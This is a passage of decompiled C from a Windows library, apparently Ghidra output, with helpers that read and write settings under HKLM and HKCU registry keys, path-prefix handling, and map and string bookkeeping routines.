        if (iVar6 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      ExceptionList = local_10;
      return iVar9;
    }
    FUN_1000ad00(piVar4,0xffffffff);
    local_8._0_1_ = 2;
    piVar4 = (int *)FUN_1000ae10(&local_20);
    local_8 = CONCAT31(local_8._1_3_,3);
    piVar5 = (int *)FUN_1000ae10(&local_1c);
    if (*piVar4 == 0) {
      iVar9 = 0;
    }
    else {
      iVar9 = *piVar4 + 0xc;
    }
    if (*piVar5 == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = *piVar5 + 0xc;
    }
    FUN_10006250("HKLM, sBase=\'%s\' sKey=\'%s\'\n",iVar6,iVar9);
    if (local_1c != (int *)0x0) {
      LOCK();
      iVar9 = *local_1c;
      *local_1c = iVar9 + -1;
      UNLOCK();
      if (iVar9 + -1 < 0) {
        FUN_100579ee(local_1c);
      }
    }
    if (local_20 != (int *)0x0) {
      LOCK();
      iVar9 = *local_20;
      *local_20 = iVar9 + -1;
      UNLOCK();
      if (iVar9 + -1 < 0) {
        FUN_100579ee(local_20);
      }
    }
    local_8 = local_8 & 0xffffff00;
    if (local_24 != (int *)0x0) {
      LOCK();
      iVar9 = *local_24;
      *local_24 = iVar9 + -1;
      UNLOCK();
      if (iVar9 + -1 < 0) {
        FUN_100579ee(local_24);
      }
    }
    if (*local_14 == 0) {
      iVar9 = 0;
    }
    else {
      iVar9 = *local_14 + 0xc;
    }
    iVar9 = FUN_1001cf10(0x80000002,iVar9,param_2,0xffffffff,0,0);
    if ((param_4 != (int *)0x1) && ((iVar9 == -1 || (param_4 == (int *)0x2)))) {
      FUN_1000ad00(local_18,0xffffffff);
      piVar5 = local_14 + 3;
      piVar4 = (int *)FUN_1001d150(&local_20,&param_4);
      iVar9 = *piVar4;
      FUN_10006f30();
      piVar4 = param_2;
      if (*piVar5 != iVar9) {
        iVar9 = *(int *)(iVar9 + 0x14);
        goto LAB_1001c6c6;
      }
      FUN_1000ad00(param_2,0xffffffff);
      local_8._0_1_ = 4;
      piVar5 = (int *)FUN_1000ae10(&param_4);
      piVar3 = local_14;
      local_8._0_1_ = 5;
      piVar7 = (int *)FUN_1000ae10(&param_2);
      if (*piVar5 == 0) {
        iVar9 = 0;
      }
      else {
        iVar9 = *piVar5 + 0xc;
      }
      if (*piVar7 == 0) {
        iVar6 = 0;
      }
      else {
        iVar6 = *piVar7 + 0xc;
      }
      FUN_10006250("HKCU, sBase=\'%s\' sKey=\'%s\'\n",iVar6,iVar9);
      FUN_10006f30();
      FUN_10006f30();
      local_8._0_1_ = 0;
      FUN_10006f30();
      if (piVar3[1] == 0) {
        iVar9 = 0;
      }
      else {
        iVar9 = piVar3[1] + 0xc;
      }
      iVar9 = FUN_1001cf10(0x80000001,iVar9,piVar4,param_3,param_5,0);
      FUN_1000ad00(local_18,0xffffffff);
      local_8 = CONCAT31(local_8._1_3_,6);
      piVar4 = (int *)FUN_1001d0f0(&param_2);
      *piVar4 = iVar9;
      FUN_10006f30();
    }
    if (iVar9 == -1) {
      iVar9 = param_3;
    }
    param_3 = iVar9;
    FUN_10006f30();
  }
  ExceptionList = local_10;
  return param_3;
}



/* Function: FUN_1001c6f0 */

void ** __thiscall
FUN_1001c6f0(int param_1,int *param_2,int *param_3,int *param_4,undefined4 *param_5)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  int iVar6;
  void **ppvVar7;
  undefined4 *puVar8;
  undefined4 uVar9;
  int iVar10;
  int *local_28;
  undefined1 local_24 [4];
  int local_20;
  int *local_1c;
  int local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  puStack_c = &LAB_100753a8;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ppvVar7 = &local_10;
  if (*(int *)(param_1 + 0x20) != 2) {
    local_8 = 0;
    ExceptionList = ppvVar7;
    local_20 = param_1;
    piVar3 = (int *)FUN_1000bfa0(param_2,0xffffffff);
    if (piVar3 == (int *)0x0) {
      local_1c = (int *)0x0;
    }
    else {
      local_1c = piVar3 + 3;
    }
    iVar10 = *(int *)(param_1 + 8);
    if ((((*(int *)(iVar10 + 0x54) == 0) || (*(int *)(iVar10 + 0x50) == 0)) ||
        (*(int *)(iVar10 + 0x34) == 0)) || (*(int *)(iVar10 + 0x4c) == 0)) {
      if ((local_1c == (int *)0x0) || ((short)*local_1c != 0)) {
        param_2 = (int *)FUN_1000bd10(uVar2);
      }
      else {
        param_2 = (int *)FUN_1000ba60();
      }
      param_4 = (int *)(param_1 + 0x14);
      local_8 = CONCAT31(local_8._1_3_,1);
      puVar8 = (undefined4 *)FUN_1001d340(&param_2);
      if ((puVar8 == (undefined4 *)*param_4) ||
         (cVar1 = FUN_1001d1f0(&param_2,puVar8 + 4), cVar1 != '\0')) {
        param_5 = &param_2;
        iVar10 = FUN_1001daa0(&param_5,&param_5,param_5);
        FUN_1001dd20(&param_5,puVar8,iVar10 + 0x10,iVar10);
        puVar8 = param_5;
      }
      ppvVar7 = (void **)FUN_10010440(*param_3);
      puVar8[5] = ppvVar7;
      if (param_2 != (int *)0x0) {
        LOCK();
        iVar10 = *param_2;
        ppvVar7 = (void **)*param_2;
        *param_2 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          ppvVar7 = (void **)FUN_100579ee(param_2);
        }
      }
    }
    else {
      piVar4 = (int *)0x0;
      if (param_4 != (int *)0x2) {
        FUN_1000ace0(param_1);
        FUN_1000ad00(param_2,0xffffffff);
        local_8._0_1_ = 3;
        FUN_1001ca90();
        piVar4 = (int *)FUN_1000ae10(&local_28);
        local_8._0_1_ = 4;
        piVar5 = (int *)FUN_1000ae10(local_24);
        if (*piVar4 == 0) {
          iVar10 = 0;
        }
        else {
          iVar10 = *piVar4 + 0xc;
        }
        if (*piVar5 == 0) {
          iVar6 = 0;
        }
        else {
          iVar6 = *piVar5 + 0xc;
        }
        FUN_10006250("HKLM, sBase=\'%s\' sKey=\'%s\'\n",iVar6,iVar10);
        FUN_10006f30();
        local_8._0_1_ = 3;
        FUN_10006f30();
        param_1 = local_20;
        if (local_14 == 0) {
          local_14 = 0;
        }
        else {
          local_14 = local_14 + 0xc;
        }
        if (local_18 == 0) {
          local_18 = 0;
        }
        else {
          local_18 = local_18 + 0xc;
        }
        local_28 = (int *)FUN_1001cd20(0x80000002,local_18,local_14,param_3,0);
        FUN_10006f30();
        local_8 = (uint)local_8._1_3_ << 8;
        FUN_10006f30();
        piVar4 = local_28;
      }
      if ((param_4 == (int *)0x1) || (piVar4 != (int *)0x0)) {
LAB_1001c9a8:
        ppvVar7 = (void **)FUN_10006f30();
        ExceptionList = local_10;
        return ppvVar7;
      }
      FUN_1000ad00(local_1c,0xffffffff);
      local_28 = (int *)(param_1 + 0x14);
      piVar4 = (int *)FUN_1001d150(local_24,&param_4);
      iVar10 = *piVar4;
      FUN_10006f30();
      piVar4 = param_3;
      if (*local_28 == iVar10) {
        FUN_1000ace0(local_20 + 4);
        FUN_1000ad00(param_2,0xffffffff);
        local_8._0_1_ = 6;
        FUN_1001ca90();
        piVar3 = (int *)FUN_1000ae10(local_24);
        local_8._0_1_ = 7;
        piVar4 = (int *)FUN_1000ae10(&local_28);
        if (*piVar3 == 0) {
          iVar10 = 0;
        }
        else {
          iVar10 = *piVar3 + 0xc;
        }
        if (*piVar4 == 0) {
          iVar6 = 0;
        }
        else {
          iVar6 = *piVar4 + 0xc;
        }
        FUN_10006250("HKCU, sBase=\'%s\' sKey=\'%s\'\n",iVar6,iVar10);
        FUN_10006f30();
        local_8._0_1_ = 6;
        FUN_10006f30();
        piVar3 = param_3;
        if (param_2 == (int *)0x0) {
          piVar4 = (int *)0x0;
        }
        else {
          piVar4 = param_2 + 3;
        }
        if (param_4 == (int *)0x0) {
          piVar5 = (int *)0x0;
        }
        else {
          piVar5 = param_4 + 3;
        }
        FUN_1001cd20(0x80000001,piVar5,piVar4,param_3,param_5);
        FUN_1000ad00(local_1c,0xffffffff);
        local_8 = CONCAT31(local_8._1_3_,8);
        puVar8 = (undefined4 *)FUN_1001d190(&param_3);
        uVar9 = FUN_10010440(*piVar3);
        *puVar8 = uVar9;
        FUN_10006f30();
        FUN_10006f30();
        FUN_10006f30();
        goto LAB_1001c9a8;
      }
      ppvVar7 = (void **)FUN_10010440(*(undefined4 *)(iVar10 + 0x14));
      *piVar4 = (int)ppvVar7;
    }
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar10 = *piVar3;
      *piVar3 = *piVar3 + -1;
      UNLOCK();
      if (iVar10 + -1 < 0) {
        ppvVar7 = (void **)FUN_100579ee(piVar3);
      }
    }
  }
  ExceptionList = local_10;
  return ppvVar7;
}



/* Function: FUN_1001ca90 */

int __fastcall FUN_1001ca90(int *param_1,int *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  int iVar5;
  int *local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100753f0;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  iVar5 = 1;
  local_1c = param_1;
  local_18 = param_2;
  while( true ) {
    iVar2 = *param_2;
    if ((((iVar2 == 0) || (*(uint *)(iVar2 + 8) < 3)) || (iVar2 == 0)) ||
       (((wchar_t *)(iVar2 + 0xc) == (wchar_t *)0x0 ||
        (iVar2 = _wcsncmp((wchar_t *)(iVar2 + 0xc),L"..\\",3), iVar2 != 0)))) {
      if (iVar5 != 0) {
        local_14 = (int *)0x0;
        local_8 = 2;
        iVar2 = FUN_1000c520(&local_14,uVar1);
        piVar3 = local_14;
        if (iVar2 != 0) {
          piVar4 = (int *)FUN_1000ba60();
          local_8 = CONCAT31(local_8._1_3_,3);
          local_20 = piVar4;
          if ((*local_18 == 0) || (*local_18 == -0xc)) {
            iVar5 = 0;
          }
          else {
            iVar5 = FUN_100106a0(&local_20,1);
          }
          if (piVar4 != (int *)0x0) {
            LOCK();
            iVar2 = *piVar4;
            *piVar4 = iVar2 + -1;
            UNLOCK();
            if (iVar2 + -1 < 0) {
              FUN_100579ee(piVar4);
            }
          }
          piVar4 = local_1c;
          if (iVar5 != 0) {
            iVar2 = FUN_1000bfa0(&DAT_1008401c,0xffffffff);
            *piVar4 = iVar2;
            if (piVar3 == (int *)0x0) {
              ExceptionList = local_10;
              return iVar5;
            }
            if (piVar3[2] != 0) {
              iVar2 = FUN_1000bfa0(piVar3 + 3,piVar3[2]);
              *piVar4 = iVar2;
            }
          }
        }
        if (piVar3 != (int *)0x0) {
          LOCK();
          iVar2 = *piVar3;
          *piVar3 = iVar2 + -1;
          UNLOCK();
          if (iVar2 + -1 < 0) {
            FUN_100579ee(piVar3);
          }
        }
      }
      ExceptionList = local_10;
      return iVar5;
    }
    if ((DAT_1009acdc & 1) == 0) {
      DAT_1009acdc = DAT_1009acdc | 1;
      local_14 = (int *)0x0;
      DAT_1009acd8 = (int *)FUN_1000bd10();
      if (DAT_1009acd8 != (int *)0x0) {
        DAT_1009acd8[2] = 0;
        *(undefined2 *)(DAT_1009acd8 + 3) = 0;
      }
      FUN_10057b51(&LAB_10078350);
    }
    if (DAT_1009acd8 != (int *)0x0) {
      LOCK();
      *DAT_1009acd8 = *DAT_1009acd8 + 1;
      UNLOCK();
    }
    piVar3 = DAT_1009acd8;
    local_20 = DAT_1009acd8;
    local_8 = 0;
    if ((*local_1c == 0) || (*local_1c == -0xc)) {
      iVar5 = 0;
    }
    else {
      iVar5 = FUN_100106a0(&local_20,1);
    }
    local_8 = 0xffffffff;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar2 = *piVar3;
      *piVar3 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    if (iVar5 == 0) break;
    piVar3 = (int *)FUN_1000ba60();
    param_2 = local_18;
    local_8 = 1;
    local_20 = piVar3;
    if ((*local_18 == 0) || (*local_18 == -0xc)) {
      iVar5 = 0;
    }
    else {
      iVar5 = FUN_100106a0(&local_20,1);
    }
    local_8 = 0xffffffff;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar2 = *piVar3;
      *piVar3 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    if (iVar5 == 0) {
      ExceptionList = local_10;
      return 0;
    }
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_1001cd20 */

undefined4 __thiscall
FUN_1001cd20(int param_1,int param_2,int *param_3,undefined4 param_4,int *param_5,int param_6)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  int *piVar4;
  undefined4 uVar5;
  int local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075418;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar2 = *(int *)(param_1 + 8);
  if ((((*(int *)(iVar2 + 0x54) != 0) && (*(int *)(iVar2 + 0x50) != 0)) &&
      (*(int *)(iVar2 + 0x34) != 0)) && (*(int *)(iVar2 + 0x4c) != 0)) {
    local_14 = 0;
    iVar2 = (**(code **)(iVar2 + 0x50))
                      (param_2,param_3,&local_14,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    if (iVar2 == 0) {
      uVar5 = 0;
      param_2 = 0x104;
      local_18 = 0;
      FUN_1001d070(0x104);
      local_8 = 0;
      uVar3 = FUN_10011610(0);
      local_1c = (**(code **)(*(int *)(param_1 + 8) + 0x54))
                           (local_14,param_4,0,&local_18,uVar3,&param_2);
      if (param_3 != (int *)0x0) {
        piVar4 = param_3 + 3;
        if (piVar4 == (int *)0x0) {
          iVar2 = 0;
        }
        else {
          do {
            iVar2 = *piVar4;
            piVar4 = (int *)((int)piVar4 + 2);
          } while ((short)iVar2 != 0);
          iVar2 = (int)piVar4 - ((int)param_3 + 0xe) >> 1;
        }
        param_3[2] = iVar2;
        *(undefined2 *)((int)param_3 + iVar2 * 2 + 0xc) = 0;
      }
      if (param_2 - 0x104U < 0x648c) {
        uVar3 = FUN_10011610(param_2);
        local_1c = (**(code **)(*(int *)(param_1 + 8) + 0x54))
                             (local_14,param_4,0,&local_18,uVar3,&param_2);
        if (param_3 != (int *)0x0) {
          piVar4 = param_3 + 3;
          if (piVar4 == (int *)0x0) {
            iVar2 = 0;
          }
          else {
            do {
              iVar2 = *piVar4;
              piVar4 = (int *)((int)piVar4 + 2);
            } while ((short)iVar2 != 0);
            iVar2 = (int)piVar4 - ((int)param_3 + 0xe) >> 1;
          }
          param_3[2] = iVar2;
          *(undefined2 *)((int)param_3 + iVar2 * 2 + 0xc) = 0;
        }
      }
      piVar4 = param_3;
      if (local_1c == 0) {
        FUN_1000e5b0();
        piVar1 = param_5;
        piVar4 = param_3;
        iVar2 = FUN_10010440(param_3);
        *piVar1 = iVar2;
        uVar5 = 1;
      }
      else if (param_6 != 0) {
        if (*param_5 == 0) {
          iVar2 = 0;
        }
        else {
          iVar2 = *param_5 + 0xc;
        }
        (**(code **)(*(int *)(param_1 + 8) + 0x4c))(local_14,param_4,0,1,iVar2,4);
      }
      (**(code **)(*(int *)(param_1 + 8) + 0x34))(local_14);
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar4;
        *piVar4 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      ExceptionList = local_10;
      return uVar5;
    }
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_1001cf10 */

undefined4 __thiscall
FUN_1001cf10(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5
            ,int param_6,int param_7)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 local_c;
  undefined4 local_8;
  
  iVar2 = *(int *)(param_1 + 8);
  if ((((*(int *)(iVar2 + 0x54) != 0) && (*(int *)(iVar2 + 0x50) != 0)) &&
      (*(int *)(iVar2 + 0x34) != 0)) && (*(int *)(iVar2 + 0x4c) != 0)) {
    local_8 = 0;
    iVar2 = (**(code **)(iVar2 + 0x50))(param_2,param_3,&local_8);
    uVar1 = param_5;
    if (iVar2 != 0) {
      return param_5;
    }
    local_c = 0;
    param_3 = param_5;
    param_2 = 4;
    iVar2 = (**(code **)(*(int *)(param_1 + 8) + 0x54))
                      (local_8,param_4,0,&local_c,&param_3,&param_2);
    if ((param_6 != 0) && ((param_7 != 0 || (iVar2 != 0)))) {
      param_5 = uVar1;
      (**(code **)(*(int *)(param_1 + 8) + 0x4c))(local_8,param_4,0,4,&param_5,4);
    }
    (**(code **)(*(int *)(param_1 + 8) + 0x34))(local_8);
    return param_3;
  }
  return 0;
}



/* Function: FUN_1001cff0 */

void __fastcall FUN_1001cff0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_1001d3f0(&local_8,*(undefined4 *)param_1[5],(undefined4 *)param_1[5]);
  thunk_FUN_100579ee(param_1[5]);
  FUN_1001d280(&local_8,*(undefined4 *)param_1[3],(undefined4 *)param_1[3]);
  thunk_FUN_100579ee(param_1[3]);
  piVar2 = (int *)param_1[1];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1001d070 */

undefined4 * __thiscall FUN_1001d070(undefined4 *param_1,uint param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  
  if (((param_2 == 0) || (param_2 == 0)) || (param_2 == 1)) {
    *param_1 = 0;
    return param_1;
  }
  uVar2 = 0x10;
  if (0x10 < param_2) {
    uVar2 = param_2;
  }
  uVar2 = uVar2 + 0xf & 0xfffffff0;
  puVar1 = (undefined4 *)FUN_100581b4(uVar2 * 2 + 0xe);
  if (puVar1 == (undefined4 *)0x0) {
    *param_1 = 0;
    return param_1;
  }
  puVar1[1] = uVar2;
  *puVar1 = 0;
  puVar1[2] = 0;
  *(undefined2 *)(puVar1 + 3) = 0;
  *param_1 = puVar1;
  return param_1;
}



/* Function: FUN_1001d0f0 */

int __thiscall FUN_1001d0f0(int *param_1,int param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar4;
  
  iVar3 = param_2;
  iVar2 = FUN_1001d340(param_2);
  uVar4 = extraout_ECX;
  if (iVar2 != *param_1) {
    cVar1 = FUN_1001d1f0(iVar3,iVar2 + 0x10);
    uVar4 = extraout_ECX_00;
    if (cVar1 == '\0') {
      return iVar2 + 0x14;
    }
  }
  param_2 = iVar3;
  iVar3 = FUN_1001daa0(uVar4,&param_2,uVar4);
  FUN_1001dae0(&param_2,iVar2,iVar3 + 0x10,iVar3);
  return param_2 + 0x14;
}



/* Function: FUN_1001d150 */

void __thiscall FUN_1001d150(int *param_1,int *param_2,int param_3)

{
  int iVar1;
  char cVar2;
  int iVar3;
  
  iVar3 = FUN_1001d340(param_3);
  iVar1 = *param_1;
  if (iVar3 != iVar1) {
    cVar2 = FUN_1001d1f0(param_3,iVar3 + 0x10);
    param_3 = iVar3;
    if (cVar2 == '\0') goto LAB_1001d17d;
  }
  param_3 = iVar1;
LAB_1001d17d:
  *param_2 = param_3;
  return;
}



/* Function: FUN_1001d190 */

int __thiscall FUN_1001d190(int *param_1,int param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar4;
  
  iVar3 = param_2;
  iVar2 = FUN_1001d340(param_2);
  uVar4 = extraout_ECX;
  if (iVar2 != *param_1) {
    cVar1 = FUN_1001d1f0(iVar3,iVar2 + 0x10);
    uVar4 = extraout_ECX_00;
    if (cVar1 == '\0') {
      return iVar2 + 0x14;
    }
  }
  param_2 = iVar3;
  iVar3 = FUN_1001daa0(uVar4,&param_2,uVar4);
  FUN_1001dd20(&param_2,iVar2,iVar3 + 0x10,iVar3);
  return param_2 + 0x14;
}



/* Function: FUN_1001d1f0 */

bool FUN_1001d1f0(int *param_1,int *param_2)

{
  ushort uVar1;
  int iVar2;
  undefined **ppuVar3;
  undefined **ppuVar4;
  undefined **ppuVar5;
  bool bVar6;
  
  iVar2 = *param_2;
  if ((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) {
    ppuVar4 = &PTR_10083554;
  }
  else if (iVar2 == 0) {
    ppuVar4 = (undefined **)0x0;
  }
  else {
    ppuVar4 = (undefined **)(iVar2 + 0xc);
  }
  if (*param_1 == 0) {
    ppuVar5 = (undefined **)0x0;
  }
  else {
    ppuVar5 = (undefined **)(*param_1 + 0xc);
  }
  ppuVar3 = &PTR_10083554;
  if (ppuVar5 != (undefined **)0x0) {
    ppuVar3 = ppuVar5;
  }
  ppuVar5 = &PTR_10083554;
  if (ppuVar4 != (undefined **)0x0) {
    ppuVar5 = ppuVar4;
  }
  while( true ) {
    uVar1 = *(ushort *)ppuVar3;
    bVar6 = uVar1 < *(ushort *)ppuVar5;
    if (uVar1 != *(ushort *)ppuVar5) break;
    if (uVar1 == 0) {
      return false;
    }
    uVar1 = *(ushort *)((int)ppuVar3 + 2);
    bVar6 = uVar1 < *(ushort *)((int)ppuVar5 + 2);
    if (uVar1 != *(ushort *)((int)ppuVar5 + 2)) break;
    ppuVar3 = ppuVar3 + 1;
    ppuVar5 = ppuVar5 + 1;
    if (uVar1 == 0) {
      return false;
    }
  }
  return (int)(-(uint)bVar6 | 1) < 0;
}



/* Function: FUN_1001d280 */

undefined4 * __thiscall FUN_1001d280(int *param_1,undefined4 *param_2,int *param_3,int *param_4)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  int *local_8;
  
  piVar2 = (int *)*param_1;
  local_8 = param_1;
  if ((param_3 == (int *)*piVar2) && (param_4 == piVar2)) {
    FUN_1001d9e0(piVar2[1]);
    *(int *)(*param_1 + 4) = *param_1;
    *(int *)*param_1 = *param_1;
    *(int *)(*param_1 + 8) = *param_1;
    param_1[1] = 0;
    *param_2 = *(undefined4 *)*param_1;
    return param_2;
  }
  if (param_3 != param_4) {
    do {
      piVar2 = param_3;
      if (*(char *)((int)param_3 + 0xd) == '\0') {
        piVar3 = (int *)param_3[2];
        if (*(char *)((int)piVar3 + 0xd) == '\0') {
          cVar1 = *(char *)(*piVar3 + 0xd);
          param_3 = piVar3;
          piVar3 = (int *)*piVar3;
          while (cVar1 == '\0') {
            cVar1 = *(char *)(*piVar3 + 0xd);
            param_3 = piVar3;
            piVar3 = (int *)*piVar3;
          }
        }
        else {
          cVar1 = *(char *)(param_3[1] + 0xd);
          piVar4 = (int *)param_3[1];
          piVar3 = param_3;
          while ((param_3 = piVar4, cVar1 == '\0' && (piVar3 == (int *)param_3[2]))) {
            cVar1 = *(char *)(param_3[1] + 0xd);
            piVar4 = (int *)param_3[1];
            piVar3 = param_3;
          }
        }
      }
      FUN_1001d4b0(&local_8,piVar2);
    } while (param_3 != param_4);
  }
  *param_2 = param_3;
  return param_2;
}



/* Function: FUN_1001d340 */

undefined4 * __thiscall FUN_1001d340(int *param_1,int *param_2)

{
  ushort uVar1;
  int iVar2;
  undefined **ppuVar3;
  uint uVar4;
  undefined **ppuVar5;
  undefined **ppuVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  bool bVar10;
  
  puVar8 = (undefined4 *)*param_1;
  if (*(char *)((int)puVar8[1] + 0xd) == '\0') {
    iVar2 = *param_2;
    puVar7 = puVar8;
    puVar9 = (undefined4 *)puVar8[1];
    do {
      puVar8 = puVar9;
      if ((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) {
        ppuVar6 = &PTR_10083554;
      }
      else if (iVar2 == 0) {
        ppuVar6 = (undefined **)0x0;
      }
      else {
        ppuVar6 = (undefined **)(iVar2 + 0xc);
      }
      if (puVar8[4] == 0) {
        ppuVar3 = (undefined **)0x0;
      }
      else {
        ppuVar3 = (undefined **)(puVar8[4] + 0xc);
      }
      ppuVar5 = &PTR_10083554;
      if (ppuVar3 != (undefined **)0x0) {
        ppuVar5 = ppuVar3;
      }
      ppuVar3 = &PTR_10083554;
      if (ppuVar6 != (undefined **)0x0) {
        ppuVar3 = ppuVar6;
      }
      do {
        uVar1 = *(ushort *)ppuVar5;
        bVar10 = uVar1 < *(ushort *)ppuVar3;
        if (uVar1 != *(ushort *)ppuVar3) {
LAB_1001d3c6:
          uVar4 = -(uint)bVar10 | 1;
          goto LAB_1001d3cb;
        }
        if (uVar1 == 0) break;
        uVar1 = *(ushort *)((int)ppuVar5 + 2);
        bVar10 = uVar1 < *(ushort *)((int)ppuVar3 + 2);
        if (uVar1 != *(ushort *)((int)ppuVar3 + 2)) goto LAB_1001d3c6;
        ppuVar5 = ppuVar5 + 1;
        ppuVar3 = ppuVar3 + 1;
      } while (uVar1 != 0);
      uVar4 = 0;
LAB_1001d3cb:
      if ((int)uVar4 < 0) {
        puVar9 = (undefined4 *)puVar8[2];
        puVar8 = puVar7;
      }
      else {
        puVar9 = (undefined4 *)*puVar8;
      }
      puVar7 = puVar8;
    } while (*(char *)((int)puVar9 + 0xd) == '\0');
  }
  return puVar8;
}



/* Function: FUN_1001d3f0 */

undefined4 * __thiscall FUN_1001d3f0(int *param_1,undefined4 *param_2,int *param_3,int *param_4)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  int *local_8;
  
  piVar2 = (int *)*param_1;
  local_8 = param_1;
  if ((param_3 == (int *)*piVar2) && (param_4 == piVar2)) {
    FUN_1001da30(piVar2[1]);
    *(int *)(*param_1 + 4) = *param_1;
    *(int *)*param_1 = *param_1;
    *(int *)(*param_1 + 8) = *param_1;
    param_1[1] = 0;
    *param_2 = *(undefined4 *)*param_1;
    return param_2;
  }
  if (param_3 != param_4) {
    do {
      piVar2 = param_3;
      if (*(char *)((int)param_3 + 0xd) == '\0') {
        piVar3 = (int *)param_3[2];
        if (*(char *)((int)piVar3 + 0xd) == '\0') {
          cVar1 = *(char *)(*piVar3 + 0xd);
          param_3 = piVar3;
          piVar3 = (int *)*piVar3;
          while (cVar1 == '\0') {
            cVar1 = *(char *)(*piVar3 + 0xd);
            param_3 = piVar3;
            piVar3 = (int *)*piVar3;
          }
        }
        else {
          cVar1 = *(char *)(param_3[1] + 0xd);
          piVar4 = (int *)param_3[1];
          piVar3 = param_3;
          while ((param_3 = piVar4, cVar1 == '\0' && (piVar3 == (int *)param_3[2]))) {
            cVar1 = *(char *)(param_3[1] + 0xd);
            piVar4 = (int *)param_3[1];
            piVar3 = param_3;
          }
        }
      }
      FUN_1001d740(&local_8,piVar2);
    } while (param_3 != param_4);
  }
  *param_2 = param_3;
  return param_2;
}



/* Function: FUN_1001d4b0 */

/* WARNING: Removing unreachable block (ram,0x1001d577) */
/* WARNING: Removing unreachable block (ram,0x1001d587) */
/* WARNING: Removing unreachable block (ram,0x1001d590) */
/* WARNING: Removing unreachable block (ram,0x1001d593) */
/* WARNING: Removing unreachable block (ram,0x1001d583) */
/* WARNING: Removing unreachable block (ram,0x1001d5a1) */
/* WARNING: Removing unreachable block (ram,0x1001d5ad) */
/* WARNING: Removing unreachable block (ram,0x1001d5b8) */
/* WARNING: Removing unreachable block (ram,0x1001d5b4) */
/* WARNING: Removing unreachable block (ram,0x1001d5a8) */
/* WARNING: Removing unreachable block (ram,0x1001d5bb) */

void __thiscall FUN_1001d4b0(int *param_1,undefined4 *param_2,int *param_3)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  int *piVar4;
  undefined4 *puVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  
  FUN_10017870();
  piVar8 = (int *)*param_3;
  if (*(char *)((int)piVar8 + 0xd) == '\0') {
    if (*(char *)(param_3[2] + 0xd) == '\0') {
      piVar8 = (int *)param_3[2];
    }
  }
  else {
    piVar8 = (int *)param_3[2];
  }
  piVar7 = (int *)param_3[1];
  if (*(char *)((int)piVar8 + 0xd) == '\0') {
    piVar8[1] = (int)piVar7;
  }
  if (*(int **)(*param_1 + 4) == param_3) {
    *(int **)(*param_1 + 4) = piVar8;
  }
  else if ((int *)*piVar7 == param_3) {
    *piVar7 = (int)piVar8;
  }
  else {
    piVar7[2] = (int)piVar8;
  }
  puVar5 = (undefined4 *)*param_1;
  if ((int *)*puVar5 == param_3) {
    piVar6 = piVar7;
    if (*(char *)((int)piVar8 + 0xd) == '\0') {
      cVar2 = *(char *)(*piVar8 + 0xd);
      piVar3 = (int *)*piVar8;
      piVar6 = piVar8;
      while (piVar4 = piVar3, cVar2 == '\0') {
        piVar3 = (int *)*piVar4;
        cVar2 = *(char *)((int)piVar3 + 0xd);
        piVar6 = piVar4;
      }
      puVar5 = (undefined4 *)*param_1;
    }
    *puVar5 = piVar6;
  }
  if (*(int **)(*param_1 + 8) == param_3) {
    if (*(char *)((int)piVar8 + 0xd) == '\0') {
      cVar2 = *(char *)(piVar8[2] + 0xd);
      piVar6 = (int *)piVar8[2];
      piVar3 = piVar8;
      while (piVar4 = piVar6, cVar2 == '\0') {
        piVar6 = (int *)piVar4[2];
